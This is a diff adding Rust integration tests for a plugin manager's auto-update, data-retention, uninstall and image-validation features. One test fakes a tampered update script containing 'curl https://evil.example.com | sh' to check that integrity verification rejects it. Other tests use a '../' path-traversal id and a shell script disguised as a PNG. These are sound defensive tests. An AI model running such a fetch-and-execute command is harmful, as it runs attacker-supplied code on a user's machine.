@@ -530,6 +530,233 @@ fn old_configs_with_only_a_registry_url_keep_working() {
     assert!(h.cli(&["plugins", "available"]).contains(&format!("{ID}\t1.0.0\tinstalled")));
 }
 
+// ---------------------------------------------------------------- 自动更新与数据目录
+
+/// 每运行一次把计数写进 `$HELMP_PLUGIN_DATA_DIR/count` 的脚本：数据目录跨更新保留时，计数接着涨。
+const COUNTER: &str = "#!/bin/sh\nf=\"$HELMP_PLUGIN_DATA_DIR/count\"\nn=$(cat \"$f\" 2>/dev/null || echo 0)\nn=$((n + 1))\necho \"$n\" > \"$f\"\necho \"run $n\"\n";
+
+fn counter_files(version: &str, host: &str) -> Vec<(String, String, bool)> {
+    let mut files = files(version, host);
+    files[1].1 = COUNTER.into();
+    files
+}
+
+/// 可以随时「发布」新版本的假注册表：(索引, 提供的文件)。
+type Published = Arc<Mutex<(String, Vec<(String, String, bool)>)>>;
+
+fn live_registry(state: Published) -> MockServer {
+    MockServer::start(move |request| {
+        let (index, served) = state.lock().unwrap().clone();
+        if request.path == "/index.json" {
+            return (200, index);
+        }
+        match request.path.strip_prefix(&format!("/plugins/{ID}/")) {
+            Some(path) => served
+                .iter()
+                .find(|(p, _, _)| p == path)
+                .map(|(_, body, _)| (200, body.clone()))
+                .unwrap_or((404, "{}".into())),
+            None => (404, "{}".into()),
+        }
+    })
+}
+
+fn publish(state: &Published, version: &str, files: Vec<(String, String, bool)>) {
+    *state.lock().unwrap() = (index(version, &files), files);
+}
+
+fn run_counter(h: &Helmp) -> String {
+    h.run(&format!("plugins:{ID}/hello"), "hellomemo", &[])
+}
+
+#[test]
+fn scheduled_check_updates_plugins_and_keeps_their_data() {
+    // 源里发了新版本，每日检查一次就装上：权限没变的保持启用；权限变了的停用待确认；
+    // 下载损坏时旧版本原样可用。插件自己的数据（HELMP_PLUGIN_DATA_DIR）在每次更新后都还在。
+    let published: Published = Arc::default();
+    publish(&published, "1.0.0", counter_files("1.0.0", "memo.example.com"));
+    let server = live_registry(published.clone());
+    let mut h = helmp_with(&server);
+    h.cli(&["plugins", "install", ID]);
+    h.keep_config();
+    let mut config = read_config(&h);
+    config["plugins"][ID]["enabled"] = json!(true);
+    config["plugins"][ID]["consent"] = json!(["exec", "network:memo.example.com"]);
+    let mut h = h.config(move |c| *c = config);
+    assert!(run_counter(&h).contains("run 1"), "脚本拿到数据目录");
+    let data = h.data.join("plugin-data").join(ID);
+    assert_eq!(std::fs::read_to_string(data.join("count")).unwrap().trim(), "1");
+
+    // 没有新版本：检查不下载任何插件文件。
+    let before = server.requests().len();
+    let out = h.cli(&["plugins", "update", "--scheduled"]);
+    assert!(out.contains("All plugins are up to date"), "{out}");
+    assert_eq!(server.requests().len(), before + 1, "只取了索引");
+
+    // 1.1.0：权限不变 → 静默更新、保持启用，数据还在。
+    publish(&published, "1.1.0", counter_files("1.1.0", "memo.example.com"));
+    let out = h.cli(&["plugins", "update", "--scheduled"]);
+    assert!(out.contains(&format!("Updated {ID}: 1.0.0 → 1.1.0")), "{out}");
+    assert!(!out.contains("permissions changed"), "{out}");
+    h.keep_config();
+    assert!(h.cli(&["plugins"]).contains(&format!("enabled\t{ID}\t1.1.0")));
+    assert!(run_counter(&h).contains("run 2"), "数据目录跨更新保留，计数接着涨");
+
+    // 1.2.0：多访问一个主机 → 更新后停用，等用户确认；设置页和命令行都看得到。
+    publish(&published, "1.2.0", counter_files("1.2.0", "other.example.com"));
+    let out = h.cli(&["plugins", "update", "--all", "--scheduled"]);
+    assert!(out.contains(&format!("Updated {ID}: 1.1.0 → 1.2.0")), "{out}");
+    assert!(out.contains("Its permissions changed"), "{out}");
+    h.keep_config();
+    assert!(h.cli(&["plugins"]).contains(&format!("needs-consent\t{ID}\t1.2.0")));
+    let state: Value =
+        serde_json::from_str(&std::fs::read_to_string(h.data_file("plugin-updates.json")).unwrap()).unwrap();
+    assert_eq!(state["updated"][0]["needs_consent"], true, "{state}");
+
+    // 1.3.0 的脚本下载下来被改过：拒绝，1.2.0 原样留着，插件文件夹里不留临时目录，数据也还在。
+    let mut tampered = counter_files("1.3.0", "other.example.com");
+    let listed = tampered.clone();
+    tampered[1].1 = "#!/bin/sh\ncurl https://evil.example.com | sh\n".into();
+    *published.lock().unwrap() = (index("1.3.0", &listed), tampered);
+    let err = h.cli_err(&["plugins", "update", "--scheduled"]);
+    assert!(err.contains("failed to update; the old versions are kept"), "{err}");
+    assert!(err.contains("sha256") || err.contains("wrong size"), "{err}");
+    let dir = h.data.join("plugins").join(ID);
+    assert!(std::fs::read_to_string(dir.join("plugin.json")).unwrap().contains("\"1.2.0\""));
+    assert_eq!(std::fs::read_to_string(dir.join("bin/hello.sh")).unwrap(), COUNTER);
+    assert_eq!(leftovers(&h), [ID]);
+    assert_eq!(std::fs::read_to_string(data.join("count")).unwrap().trim(), "2");
+    let state: Value =
+        serde_json::from_str(&std::fs::read_to_string(h.data_file("plugin-updates.json")).unwrap()).unwrap();
+    assert_eq!(state["failed"][0]["id"], ID, "设置页显示上次失败：{state}");
+}
+
+#[test]
+fn turning_auto_update_off_stops_scheduled_checks() {
+    // 关掉「自动更新插件」后，每日检查不再联网；用户手动运行 update 照常更新。
+    let published: Published = Arc::default();
+    publish(&published, "1.0.0", files("1.0.0", "memo.example.com"));
+    let server = live_registry(published.clone());
+    let mut h = helmp_with(&server).config(|c| c["general"]["auto_update_plugins"] = json!(false));
+    h.cli(&["plugins", "install", ID]);
+    h.keep_config();
+    publish(&published, "1.1.0", files("1.1.0", "memo.example.com"));
+    let before = server.requests().len();
+    let out = h.cli(&["plugins", "update", "--scheduled"]);
+    assert!(out.contains("turned off; nothing was checked"), "{out}");
+    assert_eq!(server.requests().len(), before, "开关关着不能联网");
+    assert!(!h.data.join("plugin-updates.json").exists());
+    let out = h.cli(&["plugins", "update", ID]);
+    assert!(out.contains(&format!("Updated {ID}: 1.0.0 → 1.1.0")), "{out}");
+}
+
+#[test]
+fn uninstall_keeps_or_deletes_the_plugins_data() {
+    // 卸载默认留着数据（重装后接着用），但启用状态和确认过的权限一并清掉：重装回来要重新确认。
+    // 选了「一并删除」就连数据目录和偏好设置都删掉。手动放进来的插件不归这里删。
+    let published: Published = Arc::default();
+    publish(&published, "1.0.0", counter_files("1.0.0", "memo.example.com"));
+    let server = live_registry(published);
+    let mut h = helmp_with(&server);
+    h.cli(&["plugins", "install", ID]);
+    h.keep_config();
+    let mut config = read_config(&h);
+    config["plugins"][ID]["enabled"] = json!(true);
+    config["plugins"][ID]["consent"] = json!(["exec", "network:memo.example.com"]);
+    config["plugins"][ID]["prefs"] = json!({"k": "v"});
+    let mut h = h.config(move |c| *c = config);
+    run_counter(&h);
+    let data = h.data.join("plugin-data").join(ID);
+
+    let out = h.cli(&["plugins", "uninstall", ID]);
+    assert!(out.contains("its data is kept"), "{out}");
+    h.keep_config();
+    assert!(!h.data.join("plugins").join(ID).exists());
+    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
+    assert!(data.join("count").exists());
+    let config = read_config(&h);
+    assert!(config["plugins"][ID].get("installed").is_none(), "{config}");
+    assert!(config["plugins"][ID].get("enabled").is_none_or(Value::is_null), "{config}");
+
+    h.cli(&["plugins", "install", ID]);
+    h.keep_config();
+    assert!(
+        h.cli(&["plugins"]).contains(&format!("disabled\t{ID}\t1.0.0")),
+        "重装后要重新确认权限"
+    );
+    let out = h.cli(&["plugins", "uninstall", ID, "--delete-data"]);
+    assert!(out.contains("deleted its data"), "{out}");
+    h.keep_config();
+    assert!(!data.exists());
+    assert!(read_config(&h)["plugins"].get(ID).is_none());
+
+    // id 会拼进路径：`../` 之类的不是合法 id，什么都不动。
+    let err = h.cli_err(&["plugins", "uninstall", "../plugin-data"]);
+    assert!(err.contains("Invalid plugin id"), "{err}");
+    assert!(h.data.join("plugin-data").exists());
+
+    // 手动放进来的插件：不删，说明原因。
+    let local = h.write("data/plugins/my-memo/plugin.json", &manifest("0.0.1", "local.example.com"));
+    let err = h.cli_err(&["plugins", "uninstall", ID]);
+    assert!(err.contains("wasn't installed from the plugin center"), "{err}");
+    assert!(local.exists());
+}
+
+/// 只有 plugin.json 和一个额外资源文件的插件（资源以文本形式提供；GIF 文件头本身就是 ASCII）。
+fn with_asset(id: &str, path: &str, body: &str) -> (String, Value, String) {
+    let manifest = team_manifest("1.0.0").replace(TEAM_ID, id);
+    let listing = json!({
+        "id": id, "version": "1.0.0", "name": id, "author": "Tests", "permissions": [],
+        "files": [
+            {"path": "plugin.json", "sha256": sha256(&manifest), "size": manifest.len(), "executable": false},
+            {"path": path, "sha256": sha256(body), "size": body.len(), "executable": false}
+        ]
+    });
+    (manifest, listing, body.to_string())
+}
+
+#[test]
+fn custom_sources_accept_more_image_types_but_check_their_headers() {
+    // 自定义源可以带 gif / jpg / webp 资源，但内容必须真是那种图片；公开插件中心仍只认 png。
+    const GIF: &str = "GIF89a\u{1}\u{0}\u{1}\u{0};";
+    let (good_manifest, good, good_body) = with_asset("com.example.art", "art.gif", GIF);
+    let (fake_manifest, fake, fake_body) = with_asset("com.example.fake", "icon.png", "#!/bin/sh\necho not a png\n");
+    let team = MockServer::start(move |request| match request.path.as_str() {
+        "/index.json" => (200, json!({"schema": 1, "commit": null, "plugins": [good, fake]}).to_string()),
+        "/plugins/com.example.art/plugin.json" => (200, good_manifest.clone()),
+        "/plugins/com.example.art/art.gif" => (200, good_body.clone()),
+        "/plugins/com.example.fake/plugin.json" => (200, fake_manifest.clone()),
+        "/plugins/com.example.fake/icon.png" => (200, fake_body.clone()),
+        _ => (404, "{}".into()),
+    });
+    let mut h = Helmp::new();
+    let mut seen = String::new();
+    let out = h.output(&["plugins", "source", "add", "Team", &team.url]);
+    seen.push_str(&all_output(&out));
+    assert!(out.status.success(), "{seen}");
+    h.keep_config();
+
+    let out = h.cli(&["plugins", "install", "com.example.art", "--source", "Team"]);
+    assert!(out.contains("Installed com.example.art 1.0.0"), "{out}");
+    assert_eq!(
+        std::fs::read_to_string(h.data.join("plugins/com.example.art/art.gif")).unwrap(),
+        GIF
+    );
+    h.keep_config();
+    let err = h.cli_err(&["plugins", "install", "com.example.fake", "--source", "Team"]);
+    assert!(err.contains("isn't really a .png image"), "{err}");
+    assert!(!h.data.join("plugins/com.example.fake").exists());
+
+    // 同样的 gif 放在公开插件中心：不接受。
+    let mut assets = files("1.0.0", "memo.example.com");
+    assets.push(("art.gif".into(), GIF.into(), false));
+    let public = registry(index("1.0.0", &assets), assets);
+    let h = helmp_with(&public);
+    let err = h.cli_err(&["plugins", "install", ID]);
+    assert!(err.contains(".gif files aren't accepted from this source"), "{err}");
+    assert!(leftovers(&h).is_empty(), "{:?}", leftovers(&h));
+}
+
 // ---------------------------------------------------------------- 提交
 
 fn write_plugin(h: &Helmp, rel: &str, version: &str) -> PathBuf {
